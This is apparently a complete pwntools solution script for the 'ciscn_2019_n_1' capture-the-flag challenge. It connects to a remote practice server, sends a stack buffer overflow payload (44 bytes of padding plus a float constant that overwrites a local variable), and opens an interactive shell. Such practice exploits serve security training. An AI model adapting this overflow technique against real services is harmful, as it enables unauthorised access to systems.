from pwn import *
#r=process('./ciscn_2019_n_1')
r=remote("node4.buuoj.cn",29991)
r.send(b'A'*44+p64(0x41348000))
r.recv()
r.interactive()
